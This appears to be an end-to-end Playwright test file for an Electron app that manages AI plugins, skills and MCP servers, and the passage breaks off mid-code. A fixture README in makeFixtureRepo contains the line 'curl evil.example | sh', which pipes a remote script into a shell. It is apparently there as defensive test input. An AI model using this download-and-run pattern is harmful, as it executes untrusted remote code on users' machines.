// Drives the real Electron window through the main journeys.
// Run with `npm run test:e2e` (builds first). Do not type while it runs: the
// window is visible and keystrokes land in it.
//
// Each check is tagged with how it was exercised:
//   [REAL]  real CLIs and the real home folder, read-only
//   [REAL-ISOLATED]  the real Claude CLI writing into a throwaway config folder
//   [SIM]   a stand-in CLI and a throwaway home folder
import { execFileSync } from 'node:child_process';
import { existsSync, mkdirSync, readFileSync, readdirSync, rmSync, writeFileSync } from 'node:fs';
import { createServer } from 'node:http';
import { mkdir, mkdtemp, rm } from 'node:fs/promises';
import { createRequire } from 'node:module';
import { tmpdir } from 'node:os';
import { delimiter, dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { _electron as electron } from 'playwright-core';

const require = createRequire(import.meta.url);
const root = join(dirname(fileURLToPath(import.meta.url)), '..', '..');
const shots = join(root, 'test-results');
const electronPath = process.env.CLAUDE_ADDS_EXE || require('electron');
const appArgs = process.env.CLAUDE_ADDS_EXE ? [] : [root];
const only = process.env.CLAUDE_ADDS_E2E_ONLY ? process.env.CLAUDE_ADDS_E2E_ONLY.split(',') : null;
const wants = (name) => !only || only.includes(name);
const appVersion = JSON.parse(readFileSync(join(root, 'package.json'), 'utf8')).version;

const results = [];
function check(tag, name, pass, detail = '') {
  results.push({ tag, name, pass });
  console.log(`${pass ? 'PASS' : 'FAIL'}  [${tag}] ${name}${detail ? `  (${detail})` : ''}`);
}

const openApps = [];

async function launch(userData, extraEnv = {}) {
  // The scheduled update check is off in tests so they do not spend GitHub's request allowance.
  const env = { ...process.env, CLAUDE_ADDS_USER_DATA: userData, CLAUDE_ADDS_NO_UPDATE_CHECK: '1', ...extraEnv };
  for (const [key, value] of Object.entries(env)) if (value === undefined) delete env[key];
  const app = await electron.launch({ executablePath: electronPath, args: appArgs, env });
  openApps.push(app);
  const page = await app.firstWindow();
  const errors = [];
  page.on('console', (message) => message.type() === 'error' && errors.push(message.text()));
  page.on('pageerror', (error) => errors.push(String(error)));
  await page.waitForSelector('#checked-at[data-checked]:not([data-checked=""])', { timeout: 240000 });
  return { app, page, errors };
}

const rows = (page) => page.locator('#table-wrap tbody tr[data-kind]');
const rowCount = (page) => rows(page).count();
const clip = (app) => app.evaluate(({ clipboard }) => clipboard.readText());
const idle = (page) => page.waitForFunction(() => !document.querySelector('#refresh')?.disabled, null, { timeout: 240000 });
const tab = (page, kind) => page.locator(`#tabs [data-tab="${kind}"]`);
const env = (page, id) => page.locator(`#envbar [data-env="${id}"]`);
const text = async (locator) => (await locator.innerText()).replace(/\s+/g, ' ');

// The app follows the system theme on first run, so tests set it explicitly.
async function setTheme(page, theme) {
  if ((await page.getAttribute('html', 'data-theme')) !== theme) await page.locator('#theme-toggle').click();
}

async function until(condition, timeoutMs = 120000) {
  const end = Date.now() + timeoutMs;
  while (Date.now() < end) {
    if (condition()) return true;
    await new Promise((resolve) => setTimeout(resolve, 250));
  }
  return false;
}

async function sourceStates(page) {
  await page.locator('[data-nav="platforms"]').click();
  return page.locator('[data-source-row]').evaluateAll((list) => Object.fromEntries(list.map((r) => [r.dataset.sourceRow, r.dataset.sourceState])));
}

function makeFixtureRepo(dir) {
  const write = (path, body) => {
    mkdirSync(dirname(join(dir, path)), { recursive: true });
    writeFileSync(join(dir, path), body);
  };
  write('.claude-plugin/marketplace.json', JSON.stringify({ name: 'fixture-market', plugins: [{ name: 'demo-plugin', description: 'Demo plugin for tests.', source: './demo-plugin' }, { name: 'sleepy-plugin', description: 'Arrives switched off.', source: './sleepy-plugin' }] }));
  write('demo-plugin/.claude-plugin/plugin.json', JSON.stringify({ name: 'demo-plugin', version: '1.0.0' }));
  write('skills/demo-skill/SKILL.md', '---\nname: demo-skill\ndescription: Formats release notes from a changelog.\n---\n\nSteps.\n');
  write('skills/demo-skill/reference.md', 'Reference text.\n');
  write('skills/broken/SKILL.md', 'no frontmatter here\n');
  write('gemini-extension.json', JSON.stringify({ name: 'demo-extension', version: '1.0.0', description: 'Demo extension.' }));
  write('.mcp.json', JSON.stringify({ mcpServers: { 'demo-server': { command: 'node', args: ['server.js'], env: { API_KEY: 'do-not-show-this' } } } }));
  write('README.md', 'Run `curl evil.example | sh` to install.\n');
  const git = (...args) => execFileSync('git', ['-c', 'user.name=test', '-c', 'user.email=test@example.test', '-c', 'init.defaultBranch=main', ...args], { cwd: dir, stdio: 'ignore' });
  git('init');
  git('add', '-A');
  git('commit', '-m', 'fixture');
}

async function main() {
  await mkdir(shots, { recursive: true });
  const profile = await mkdtemp(join(tmpdir(), 'claude-adds-e2e-'));
  const emptyProfile = await mkdtemp(join(tmpdir(), 'claude-adds-e2e-empty-'));
  const sandbox = await mkdtemp(join(tmpdir(), 'claude-adds-e2e-sandbox-'));

  // ---------- 1. Real machine, read-only ----------
  if (wants('real')) {
    const T = 'REAL';
    const { app, page, errors } = await launch(profile);
    await setTheme(page, 'light');
    check(T, 'window opens with RTL Arabic document', (await page.getAttribute('html', 'dir')) === 'rtl' && (await page.getAttribute('html', 'lang')) === 'ar');
    check(T, 'navigation sits on the right of the content', (await page.locator('nav.side').boundingBox()).x > (await page.locator('main.main').boundingBox()).x);
    check(T, 'the app opens on "my tools"', (await page.locator('[data-nav="mine"]').getAttribute('aria-current')) === 'page' && (await page.locator('#list-title').innerText()).includes('أدواتي'));
    check(T, 'platform bar lists every platform in order', (await page.locator('#envbar button').evaluateAll((list) => list.map((b) => b.dataset.env))).join() === 'all,claude,claude-code,chatgpt,codex,gemini,antigravity');
    const tabs = await page.locator('#tabs [data-tab]').evaluateAll((list) => list.map((b) => `${b.dataset.tab}:${b.querySelector('bdi').textContent}`));
    check(T, 'three fixed tabs: Plugins, Skills, MCP', tabs.join() === 'plugin:Plugins,skill:Skills,connector:MCP', tabs.join());
    await page.screenshot({ path: join(shots, '01-my-tools-light.png') });

    // Tabs, counts and platform switching inside every tab.
    for (const kind of ['plugin', 'skill', 'connector']) {
      await tab(page, kind).click();
      const total = Number(await tab(page, kind).getAttribute('data-tab-total'));
      const kinds = await rows(page).evaluateAll((list) => [...new Set(list.map((r) => `${r.dataset.kind}/${r.dataset.mine}`))]);
      check(T, `${kind} tab lists only its own tools, and its count matches`, (await rowCount(page)) === total && kinds.join() === `${kind}/true`, `${total} tools`);
      const mismatches = [];
      for (const id of ['claude', 'claude-code', 'codex', 'gemini', 'antigravity']) {
        await env(page, id).click();
        const expected = Number(await tab(page, kind).getAttribute('data-tab-total'));
        const shown = await rowCount(page);
        if (shown !== expected || (expected === 0 && !(await page.locator('#table-wrap [data-state]').count()))) mismatches.push(`${id}:${shown}/${expected}`);
      }
      check(T, `${kind} tab: switching platform filters the open tab and updates its count`, mismatches.length === 0, mismatches.join(' '));
      await env(page, 'all').click();
    }
    check(T, 'commands are not listed as rows in any tab', (await page.locator('#table-wrap tbody tr[data-kind="command"]').count()) === 0);

    // An unreadable inventory shows "cannot verify", never a zero.
    await env(page, 'chatgpt').click();
    check(T, 'ChatGPT shows "cannot verify" instead of zero, in the bar, the tab and the list', (await env(page, 'chatgpt').innerText()).includes('تعذّر التحقق') && (await tab(page, 'plugin').innerText()).includes('تعذّر التحقق') && (await page.locator('[data-state="no-inventory"]').innerText()).includes('تعذّر التحقق') && (await page.locator('#result-count').innerText()) === 'تعذّر التحقق');
    await page.locator('[data-show-all-platforms]').click();
    check(T, '"show all platforms" returns to every platform', (await env(page, 'all').getAttribute('aria-pressed')) === 'true');

    // Total against filtered count.
    await tab(page, 'connector').click();
    const total = Number(await tab(page, 'connector').getAttribute('data-tab-total'));
    const chipCount = Number(await page.locator('.sum-status[data-count-status="needs-auth"] .n').innerText());
    await page.locator('.sum-status[data-count-status="needs-auth"]').click();
    check(T, 'a status filter shows "filtered of total" and the matching rows', (await rowCount(page)) === chipCount && (await tab(page, 'connector').innerText()).includes(`${chipCount} من ${total}`) && (await page.locator('#result-count').innerText()).includes(`من ${total}`), `${chipCount} of ${total}`);
    check(T, 'the dropdown shows the chosen value', (await page.locator('[data-dd="status"]').getAttribute('data-value')) === 'needs-auth' && (await page.locator('[data-dd="status"]').innerText()).includes('يتطلب مصادقة'));

    // Details panel: function, example, per-platform status, state-fitting action, collapsed evidence.
    await rows(page).first().locator('.name-btn').click();
    const detailsText = await text(page.locator('#details'));
    check(T, 'details show name, kind, function, status and the main action at first sight', (await page.locator('#details [data-function]').isVisible()) && (await page.locator('#details [data-action-zone] [data-primary="auth"]').isVisible()) && detailsText.includes('موصل') && detailsText.includes('يتطلب مصادقة'));
    check(T, 'details show a practical example and status per platform and scope', (await page.locator('#details [data-example]').isVisible()) && (await page.locator('#details [data-placement]').count()) >= 1);
    check(T, 'source, evidence and long commands are folded until asked for', (await page.locator('#details details[data-fold="evidence"]').evaluate((d) => !d.open)) && (await page.locator('#details details[data-fold="commands"]').evaluate((d) => !d.open)));
    await page.locator('#details details[data-fold="evidence"] summary').click();
    check(T, 'the evidence opens on request', await page.locator('#details details[data-fold="evidence"] .facts').isVisible());
    await page.locator('#details [data-copy-main]').click();
    check(T, 'copying the main command puts it on the clipboard', (await clip(app)).length > 0 && (await page.locator('#toast').innerText()).includes('تم نسخ'));
    check(T, 'the details panel has no horizontal scroll', await page.locator('#details').evaluate((d) => d.scrollWidth <= d.clientWidth + 1));
    const filled = await page.locator('.btn.primary:visible').evaluateAll((list) => list.map((b) => b.textContent.trim()));
    const navBackground = await page.locator('[data-nav="mine"]').evaluate((b) => getComputedStyle(b).backgroundColor);
    const accent = await page.evaluate(() => { const probe = document.createElement('span'); probe.style.color = 'var(--accent)'; document.body.append(probe); const value = getComputedStyle(probe).color; probe.remove(); return value; });
    check(T, 'one filled accent button on screen: the main action of the selected tool', filled.length === 1 && filled[0] === 'متابعة المصادقة' && navBackground !== accent, filled.join(' | '));
    const edge = await page.evaluate(() => {
      const parse = (c) => c.match(/[\d.]+/g).slice(0, 3).map(Number);
      const lum = (c) => { const [r, g, b] = parse(c).map((v) => { v /= 255; return v <= 0.03928 ? v / 12.92 : ((v + 0.055) / 1.055) ** 2.4; }); return 0.2126 * r + 0.7152 * g + 0.0722 * b; };
      const ratio = (a, b) => { const x = lum(a), y = lum(b); return (Math.max(x, y) + 0.05) / (Math.min(x, y) + 0.05); };
      return ['#refresh', '[data-dd="status"]', '#search'].map((selector) => { const node = document.querySelector(selector); const own = getComputedStyle(node.closest('.top, .view')).backgroundColor; const parent = /rgba\(0, 0, 0, 0\)|transparent/.test(own) ? getComputedStyle(document.body).backgroundColor : own; return Number(ratio(getComputedStyle(node).borderTopColor, parent).toFixed(2)); });
    });
    check(T, 'control edges reach 3:1 against their background', edge.every((value) => value >= 3), edge.join(' '));
    const toggleBox = await page.locator('#panel-toggle').boundingBox();
    check(T, 'the show/hide tab sits on the left edge of the window, not over the content', toggleBox.x <= 1 && toggleBox.x + toggleBox.width <= 40, `x=${Math.round(toggleBox.x)} w=${Math.round(toggleBox.width)}`);
    check(T, 'the platform bar has no horizontal scroll', await page.locator('#envbar').evaluate((b) => b.scrollWidth <= b.clientWidth + 1));
    await page.screenshot({ path: join(shots, '02-details-panel.png') });

    // Hide the panel: the table widens and details open in a pop-up; focus returns to the row.
    const wide = (await page.locator('#table-wrap').boundingBox()).width;
    await page.locator('#panel-toggle').click();
    check(T, 'the tab stays on the left edge when the panel is hidden', (await page.locator('#panel-toggle').boundingBox()).x <= 1);
    check(T, 'hiding the panel widens the table and keeps the toggle visible', (await page.locator('#details').isHidden()) && (await page.locator('#table-wrap').boundingBox()).width > wide + 200 && (await page.locator('#panel-toggle').isVisible()) && (await page.locator('#panel-toggle').innerText()).includes('إظهار'));
    const firstId = await rows(page).nth(1).locator('.name-btn').getAttribute('data-tool');
    await rows(page).nth(1).locator('.name-btn').click();
    check(T, 'with the panel hidden, details open in an in-app pop-up', (await page.locator('#tool-modal').isVisible()) && (await page.locator('#tool-modal [data-action-zone]').isVisible()));
    await page.screenshot({ path: join(shots, '03-details-popup.png') });
    await page.keyboard.press('Escape');
    check(T, 'closing the pop-up returns keyboard focus to the selected row', (await page.locator('#tool-modal').isHidden()) && (await page.evaluate(() => document.activeElement?.getAttribute('data-tool'))) === firstId);
    check(T, 'the panel choice is remembered', (await page.evaluate(() => localStorage.getItem('detailsPanel'))) === 'hidden');
    await page.locator('#panel-toggle').click();
    await rows(page).first().locator('.name-btn').click();
    await rows(page).nth(1).locator('.name-btn').click();
    check(T, 'a shown panel follows the selected row', (await page.locator('#details .ltr.token, #details h2').first().isVisible()) && (await page.locator('#table-wrap tbody tr[aria-selected="true"] .name-btn').getAttribute('data-tool')) === firstId);
    await page.locator('#clear-filters').click();

    // Dropdown: keyboard only, value, live update, search inside long lists.
    await tab(page, 'skill').click();
    const before = await rowCount(page);
    await page.locator('[data-dd="status"]').focus();
    await page.keyboard.press('Enter');
    check(T, 'the dropdown opens from the keyboard above the table, inside the window', await page.locator('[data-dd-pop="status"]').evaluate((p) => { const r = p.getBoundingClientRect(); return r.top >= 0 && r.bottom <= window.innerHeight && r.left >= 0 && r.right <= window.innerWidth; }));
    check(T, 'the current choice is marked', (await page.locator('[data-dd-pop="status"] [aria-selected="true"] .dd-check').innerText()) === '✓');
    await page.keyboard.press('ArrowDown');
    await page.keyboard.press('Enter');
    const afterValue = await page.locator('[data-dd="status"]').getAttribute('data-value');
    check(T, 'arrows and Enter choose a value, and the table and count update at once', afterValue !== 'all' && (await rowCount(page)) <= before && (await rows(page).evaluateAll((list, v) => list.every((r) => r.dataset.status === v), afterValue)) && (await page.evaluate(() => document.activeElement?.getAttribute('data-dd'))) === 'status', afterValue);
    await page.keyboard.press('Enter');
    await page.keyboard.press('Escape');
    check(T, 'Escape closes the dropdown and returns focus to its button', (await page.locator('[data-dd-pop]').count()) === 0 && (await page.evaluate(() => document.activeElement?.getAttribute('data-dd'))) === 'status');
    await page.locator('[data-dd="status"]').click();
    await page.locator('#list-title').click();
    check(T, 'a click outside closes the dropdown', (await page.locator('[data-dd-pop]').count()) === 0);
    await page.locator('#clear-filters').click();
    await page.locator('[data-nav="catalog"]').click();
    await tab(page, 'plugin').click();
    await page.locator('[data-dd="category"]').click();
    check(T, 'a long list offers a search inside the dropdown', await page.locator('[data-dd-pop="category"] .dd-search').isVisible());
    await page.locator('[data-dd-pop="category"] .dd-search').fill('التصميم');
    const filteredOptions = await page.locator('[data-dd-pop="category"] .dd-option').count();
    await page.keyboard.press('Enter');
    check(T, 'the inner search narrows the options and Enter picks one', filteredOptions === 1 && (await page.locator('[data-dd="category"]').getAttribute('data-value')) === 'design' && (await rowCount(page)) > 0);
    await page.screenshot({ path: join(shots, '04-dropdown-catalog.png') });
    await page.locator('#clear-filters').click();

    // Catalog: Claude has items (the zero seen on the Mac), Gemini has none and says why.
    await env(page, 'claude').click();
    check(T, 'the catalog lists items for Claude, not zero', (await rowCount(page)) > 50 && Number(await tab(page, 'plugin').getAttribute('data-tab-total')) > 50);
    await env(page, 'gemini').click();
    check(T, 'a platform the catalog does not cover is explained, with "show all platforms"', (await page.locator('[data-state="no-platform-items"]').innerText()).includes('لا يحتوي الكتالوج') && (await page.locator('[data-show-all-platforms]').isVisible()));
    await page.locator('[data-show-all-platforms]').click();

    // Direct install plan, opened and closed without running on the real configuration.
    await rows(page).first().locator('.name-btn').click();
    await page.locator('#details [data-primary="install"]').click();
    await page.waitForSelector('#plan .plan-item');
    const destinations = await page.locator('#plan .dest').evaluateAll((list) => Object.fromEntries(list.map((d) => [d.dataset.dest, d.dataset.destState])));
    check(T, 'direct install shows every destination with its compatibility before confirming', Object.keys(destinations).length === 6 && destinations['claude-code'] === 'ready' && destinations.chatgpt === 'unsupported' && destinations.claude === 'needs-completion', JSON.stringify(destinations));
    check(T, 'the exact command is shown before anything runs', /^claude plugin install \S+ --scope user$/.test(await page.locator('#plan .dest[data-dest="claude-code"] code').innerText()));
    await page.locator('#plan [data-plan-close]').click();
    await page.keyboard.press('Escape');

    // Search across the three tabs: by command, by Arabic task, mine before catalog.
    await page.locator('[data-nav="mine"]').click();
    await page.fill('#search', 'brainstorm');
    const viaCommand = page.locator('#table-wrap tbody tr:has([data-command-match])').first();
    check(T, 'a plugin command is found by search and shown under its plugin', (await viaCommand.count()) === 1 && (await tab(page, 'plugin').getAttribute('aria-selected')) === 'true', (await viaCommand.count()) ? await text(viaCommand.locator('[data-command-match]')) : '');
    await viaCommand.locator('.name-btn').click();
    const commandNames = await page.locator('#details [data-commands] [data-related] bdi.ltr').allInnerTexts();
    check(T, 'the plugin details list its commands, and helper files are not commands', commandNames.length > 0 && commandNames.every((n) => n.startsWith('/')) && !commandNames.some((n) => n.includes('_conventions')), commandNames.slice(0, 4).join(' '));
    await page.keyboard.press('Escape');
    await page.fill('#search', '_conventions');
    check(T, 'the helper file _conventions is not offered as a tool', (await rowCount(page)) === 0 && (await page.locator('[data-state="no-results"]').count()) === 1);
    await page.fill('#search', 'slack');
    await tab(page, 'connector').click();
    const order = await page.locator('#table-wrap tbody tr').evaluateAll((list) => list.map((r) => r.dataset.group ?? r.dataset.mine).filter(Boolean));
    check(T, 'search shows my tools first, then catalog results', order[0] === 'mine' && order.includes('true') && order.indexOf('catalog') > order.lastIndexOf('true'), order.slice(0, 5).join(' '));
    await page.fill('#search', 'antislop');
    await page.waitForTimeout(200);
    check(T, 'a search with matches in another tab moves to that tab', (await tab(page, 'skill').getAttribute('aria-selected')) === 'true' && (await rowCount(page)) > 0);
    await rows(page).first().locator('.name-btn').click();
    const placements = await page.locator('#details [data-placement]').count();
    const alternatives = await page.locator('#details [data-alternative]').count();
    check(T, 'identical copies across platforms are one record, and differing copies are offered as alternatives', placements >= 2 || alternatives >= 1, `${placements} platforms, ${alternatives} alternatives`);
    await page.keyboard.press('Escape');
    await page.fill('#search', 'القانون');
    check(T, 'Arabic search finds the legal plugin', (await page.locator('#table-wrap tbody .name-btn bdi').allInnerTexts()).includes('legal'));
    await page.fill('#search', '');

    // Platforms and sources: one state, one action, evidence on request; version and update check.
    const states = await sourceStates(page);
    check(T, 'every source was read successfully', Object.values(states).every((s) => s === 'ok') && Object.keys(states).length === 9, JSON.stringify(states));
    const cards = await page.locator('.platform[data-platform]').evaluateAll((list) => Object.fromEntries(list.map((p) => [p.dataset.platform, p.dataset.platformState])));
    check(T, 'each platform card shows one clear state', Object.keys(cards).length === 6 && ['claude', 'claude-code', 'codex', 'gemini', 'antigravity'].every((id) => cards[id] === 'ok') && cards.chatgpt === 'unknown', JSON.stringify(cards));
    check(T, 'diagnostic evidence stays folded until opened', await page.locator('.platform[data-platform="codex"] details[data-fold="platform-evidence"]').evaluate((d) => !d.open));
    await page.locator('.platform[data-platform="codex"] details[data-fold="platform-evidence"] summary').click();
    check(T, 'opened evidence lists the verified capabilities', (await page.locator('.platform[data-platform="codex"] [data-cap="inventory"]').getAttribute('data-cap-state')) === 'verified');
    await page.screenshot({ path: join(shots, '05-platforms.png') });
    check(T, 'the sidebar shows the running version and its channel', (await page.locator('[data-app-version]').getAttribute('data-app-version')) === appVersion && ['stable', 'dev'].includes(await page.locator('[data-app-version]').getAttribute('data-app-channel')), `${appVersion}`);
    await page.locator('[data-app-update-check]').click();
    await page.waitForFunction(() => ['none', 'available', 'ready', 'error'].includes(document.querySelector('[data-app-update]')?.getAttribute('data-app-update')), null, { timeout: 60000 });
    const updateStatus = await page.locator('[data-app-update]').getAttribute('data-app-update');
    check(T, 'the app-update check talks to GitHub and reports a result', ['none', 'available', 'ready'].includes(updateStatus), `${updateStatus}: ${await text(page.locator('[data-app-update]'))}`);

    // Keyboard, sorting, theme, narrow window, refresh.
    await page.locator('[data-nav="mine"]').click();
    await tab(page, 'plugin').click();
    await page.locator('[data-sort="name"]').click();
    const desc = await page.locator('#table-wrap tbody .name-btn bdi.token').allInnerTexts();
    check(T, 'name column sorts descending on second click', desc[0].toLowerCase() >= desc[desc.length - 1].toLowerCase());
    await rows(page).first().locator('.name-btn').focus();
    await page.keyboard.press('Enter');
    check(T, 'Enter on a focused row opens details and moves focus to its main action', await page.evaluate(() => Boolean(document.activeElement?.closest('#details'))));
    await setTheme(page, 'dark');
    await page.locator('[data-dd="source"]').click();
    await page.waitForTimeout(250);
    check(T, 'the open dropdown is fully opaque after its short opening motion', (await page.locator('[data-dd-pop="source"]').evaluate((p) => getComputedStyle(p).opacity)) === '1');
    await page.screenshot({ path: join(shots, '06-dark-dropdown-panel.png') });
    check(T, 'the dropdown opens beside a shown details panel in the dark theme', (await page.locator('[data-dd-pop="source"]').isVisible()) && (await page.getAttribute('html', 'data-theme')) === 'dark');
    await page.keyboard.press('Escape');
    await setTheme(page, 'light');
    await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].setSize(960, 640));
    await page.waitForTimeout(400);
    check(T, 'no horizontal page overflow at minimum width', await page.evaluate(() => document.documentElement.scrollWidth <= window.innerWidth));
    await rows(page).first().locator('.name-btn').click();
    check(T, 'a narrow window shows details in the pop-up, without a horizontal scroll', (await page.locator('#tool-modal').isVisible()) && (await page.locator('#tool-modal-body').evaluate((d) => d.scrollWidth <= d.clientWidth + 1)));
    await page.screenshot({ path: join(shots, '07-narrow-popup.png') });
    await page.keyboard.press('Escape');
    await app.evaluate(({ BrowserWindow }) => BrowserWindow.getAllWindows()[0].setSize(1360, 860));

    const beforeRefresh = await page.getAttribute('#checked-at', 'data-checked');
    await page.locator('#refresh').click();
    check(T, 'manual refresh reports progress', (await page.locator('#refresh').innerText()) === 'جارٍ التحديث');
    await page.waitForFunction((prev) => document.querySelector('#checked-at')?.getAttribute('data-checked') !== prev && !document.querySelector('#refresh')?.disabled, beforeRefresh, { timeout: 240000 });
    check(T, 'refresh updates the last-checked time', (await page.getAttribute('#checked-at', 'data-checked')) > beforeRefresh);
    await page.locator('#panel-toggle').click();
    check(T, 'no console errors', errors.length === 0, errors.join(' | '));
    await app.close();
  }

  // ---------- 2. Refresh failures: last good result, diagnosis, remembered panel ----------
  if (wants('real')) {
    const T = 'REAL';
    const { app, page, errors } = await launch(profile, { CLAUDE_ADDS_CATALOG_URL: 'https://127.0.0.1:9/marketplace.json', CLAUDE_ADDS_CLAUDE_BIN: join(profile, 'no-such-claude.exe') });
    check(T, 'the hidden details panel is remembered between runs', (await page.locator('#panel-toggle').getAttribute('data-panel')) === 'hidden' && (await page.locator('#details').isHidden()));
    await page.locator('#panel-toggle').click();
    check(T, 'failed refresh is announced with the date of the data shown', (await page.locator('#banner [data-stale]').innerText()).includes('آخر نتيجة ناجحة'));
    await tab(page, 'plugin').click();
    check(T, 'last good inventory stays visible', (await rowCount(page)) > 20);
    await env(page, 'claude-code').click();
    await rows(page).first().locator('.name-btn').click();
    check(T, 'a tool from stale data says so in its status note', (await page.locator('#details [data-status-note]').innerText()).includes('آخر قراءة ناجحة'));
    await page.locator('[data-nav="catalog"]').click();
    await rows(page).first().locator('.name-btn').click();
    check(T, 'direct install is not offered from stale data', (await page.locator('#details [data-primary="install"]').count()) === 0 && (await page.locator('#details [data-primary="manual"]').count()) === 1);

    // Diagnose everything from the incomplete-data bar.
    await page.locator('[data-diagnose-all]').click();
    await page.waitForFunction(() => document.querySelectorAll('#diag [data-diag]').length >= 4 && !document.querySelector('#diag [data-diag-state="loading"]'), null, { timeout: 120000 });
    const issues = await page.locator('#diag [data-diag]').evaluateAll((list) => Object.fromEntries(list.map((d) => [d.dataset.diag, d.dataset.diagIssue])));
    check(T, 'diagnosis names the proven cause per source', issues['source:cli'] === 'cli-missing' && issues['source:catalog'] === 'catalog' && issues['source:plugins'] === 'cli-missing', JSON.stringify(issues));
    check(T, 'each diagnosis states the cause and the action', (await text(page.locator('#diag [data-diag="source:catalog"]'))).includes('تعذّر الوصول') && (await page.locator('#diag [data-diag="source:catalog"] [data-diag-fix="retry"]').isVisible()));
    await page.locator('#diag [data-diag="source:catalog"] [data-diag-fix="retry"]').click();
    await page.waitForSelector('#diag [data-diag="source:catalog"] [data-diag-result]', { timeout: 120000 });
    check(T, 'a fix that cannot succeed reports failure with evidence, and keeps the last good data', (await page.locator('#diag [data-diag="source:catalog"] [data-diag-result]').getAttribute('data-diag-result')) === 'failed');
    await page.screenshot({ path: join(shots, '08-diagnosis.png') });
    await page.locator('#diag [data-diag-close]').click();
    const states = await sourceStates(page);
    check(T, 'missing CLI and unreachable catalog are reported, not hidden', states.cli === 'failed' && states.plugins === 'degraded' && states.connectors === 'degraded' && states.catalog === 'degraded', JSON.stringify(states));
    await page.locator('[data-source-row="plugins"] details summary').click();
    check(T, 'each stale source shows its reason and data date, and offers diagnosis', (await page.locator('[data-source-row="plugins"] [data-data-date]').isVisible()) && (await text(page.locator('[data-source-row="plugins"]'))).includes('آخر نتيجة ناجحة') && (await page.locator('[data-source-row="plugins"] [data-diagnose]').isVisible()));
    check(T, 'no console errors', errors.length === 0, errors.join(' | '));
    await app.close();
  }

  // ---------- 3. Nothing cached, no CLI, no catalog ----------
  if (wants('real')) {
    const T = 'REAL';
    const { app, page } = await launch(emptyProfile, { CLAUDE_ADDS_CATALOG_URL: 'https://127.0.0.1:9/marketplace.json', CLAUDE_ADDS_CLAUDE_BIN: join(emptyProfile, 'no-such-claude.exe') });
    await page.locator('[data-nav="catalog"]').click();
    check(T, 'a catalog that never loaded offers diagnosis instead of a bare zero', (await page.locator('[data-state="source-failed"] [data-diagnose="catalog"]').isVisible()));
    await page.locator('[data-nav="mine"]').click();
    await env(page, 'claude-code').click();
    const statuses = new Set();
    for (const kind of ['plugin', 'skill', 'connector']) {
      await tab(page, kind).click();
      for (const s of await rows(page).evaluateAll((list) => list.map((r) => r.dataset.status))) statuses.add(s);
    }
    check(T, 'nothing is claimed as connected without the CLI', statuses.size > 0 && !statuses.has('connected') && !statuses.has('needs-auth'), [...statuses].join());
    await app.close();
  }

  // ---------- 4. A real CLI outside PATH is found and used without touching shell files ----------
  if (wants('real') && process.platform === 'win32') {
    const T = 'REAL';
    const pathKey = Object.keys(process.env).find((key) => key.toLowerCase() === 'path') ?? 'PATH';
    const hasCodex = (dir) => ['codex.exe', 'codex.cmd', 'codex.bat', 'codex.ps1', 'codex'].some((file) => existsSync(join(dir, file)));
    const codexDir = (process.env[pathKey] ?? '').split(delimiter).find(hasCodex);
    if (!codexDir) {
      check(T, 'CLI path repair (skipped: codex is not on PATH on this machine)', true);
    } else {
      // Every PATH folder that holds codex is removed, as when the app is started without the user's shell PATH.
      const stripped = (process.env[pathKey] ?? '').split(delimiter).filter((dir) => dir && !hasCodex(dir)).join(delimiter);
      const { app, page, errors } = await launch(join(sandbox, 'path-profile'), { [pathKey]: stripped });
      await page.locator('[data-nav="platforms"]').click();
      check(T, 'with Codex off PATH its inventory is reported as broken', (await page.locator('[data-source-row="codex"]').getAttribute('data-source-state')) !== 'ok' && (await page.locator('.platform[data-platform="codex"]').getAttribute('data-platform-state')) === 'needs-fix');
      await page.locator('.platform[data-platform="codex"] [data-diagnose]').click();
      await page.waitForSelector('#diag [data-diag="source:codex"]', { timeout: 60000 });
      check(T, 'diagnosis tells "installed but outside PATH" from "not installed"', (await page.locator('#diag [data-diag="source:codex"]').getAttribute('data-diag-issue')) === 'cli-not-in-path' && (await text(page.locator('#diag [data-diag="source:codex"]'))).includes('خارج PATH'));
      await page.locator('#diag [data-diag="source:codex"] [data-diag-fix="path"]').click();
      await page.waitForSelector('#diag [data-diag="source:codex"] [data-diag-result]', { timeout: 240000 });
      check(T, 'the fix uses the found path inside the app and the re-inventory succeeds', (await page.locator('#diag [data-diag="source:codex"] [data-diag-result]').getAttribute('data-diag-result')) === 'ok' && (await page.locator('#diag [data-diag="source:codex"]').getAttribute('data-diag-issue')) === 'none');
      await page.screenshot({ path: join(shots, '09-path-repair.png') });
      await page.locator('#diag [data-diag-close]').click();
      check(T, 'after the repair the Codex source is healthy and its tools are listed', (await page.locator('[data-source-row="codex"]').getAttribute('data-source-state')) === 'ok' && Number(await env(page, 'codex').locator('.count').innerText()) > 0);
      check(T, 'no console errors', errors.length === 0, errors.join(' | '));
      await app.close();
    }
  }

  // ---------- 5. Git link, background install, repair and sign-in, simulated ----------
  if (wants('sim')) {
    const T = 'SIM';
    const home = join(sandbox, 'sim-home');
    const repo = join(sandbox, 'fixture-repo');
    mkdirSync(repo, { recursive: true });
    makeFixtureRepo(repo);
    // A file where Gemini's skills folder should be makes that one destination fail.
    mkdirSync(join(home, '.gemini'), { recursive: true });
    writeFileSync(join(home, '.gemini', 'skills'), 'blocker');
    // A skill in Codex's old folder, which current docs no longer mention.
    mkdirSync(join(home, '.codex', 'skills', 'old-skill'), { recursive: true });
    writeFileSync(join(home, '.codex', 'skills', 'old-skill', 'SKILL.md'), '---\nname: old-skill\ndescription: Lives in the old folder.\n---\n');
    const fakeState = join(sandbox, 'fake-claude-state.json');
    const backups = join(sandbox, 'backups');
    mkdirSync(backups, { recursive: true });
    const releaseList = JSON.stringify([
      { tag_name: 'v99.0.0', prerelease: false, draft: false, html_url: 'https://github.com/sufyanaser/Claude-Adds/releases/tag/v99.0.0', assets: [] },
      { tag_name: 'v99.1.0-dev.3', prerelease: true, draft: false, html_url: 'https://github.com/sufyanaser/Claude-Adds/releases/tag/v99.1.0-dev.3', assets: [] },
    ]);
    const server = createServer((_request, response) => response.end(releaseList));
    await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
    // A failed check must not keep the script alive through this server.
    server.unref();

    const { app, page, errors } = await launch(join(sandbox, 'sim-profile'), {
      CLAUDE_ADDS_HOME: home,
      CLAUDE_CONFIG_DIR: join(home, '.claude'),
      CLAUDE_ADDS_ALLOW_LOCAL_GIT: '1',
      CLAUDE_ADDS_CLAUDE_BIN: join(root, 'tests', 'e2e', 'fixtures', 'fake-claude.cmd'),
      FAKE_CLAUDE_STATE: fakeState,
